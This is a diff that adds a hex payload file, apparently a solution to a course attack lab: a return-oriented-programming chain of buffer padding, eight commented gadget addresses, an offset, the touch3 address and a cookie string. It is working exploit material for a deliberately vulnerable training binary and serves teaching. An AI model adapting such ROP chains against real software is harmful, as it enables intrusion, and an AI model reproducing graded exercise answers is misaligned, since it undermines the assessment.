@@ -1,0 +1,14 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* first 24 (buffer size) bytes here are just padding */
+48 1e 42 00 00 00 00 00 /* gadget 1: movq %rsp,%rax, get $rsp address */
+1b 1e 42 00 00 00 00 00 /* gadget 2: movq %rax,%rdi, save address of $rsp to $rdi */
+36 1e 42 00 00 00 00 00 /* gadget 3: popq %rax, save the date in $rsp to $rax */
+48 00 00 00 00 00 00 00 /* $rsp, it stores the bias address where the cookie is present */
+7d 1e 42 00 00 00 00 00 /* gadget 4: movq %eax,%ecx */
+55 1e 42 00 00 00 00 00 /* gadget 5: movq %ecx,%edx */
+09 1f 42 00 00 00 00 00 /* gadget 6: movq %edx,%esi, $esi stores the bias address*/
+41 1e 42 00 00 00 00 00 /* gadget 7: lea (%rdi,%rsi,1),%rax, $rax stores the cookies */
+28 1e 42 00 00 00 00 00 /* gadget 8: movq %eax,%edi */
+77 1d 42 00 00 00 00 00 /* touch3 address */
+34 35 64 61 32 39 34 63 /* cookie string */
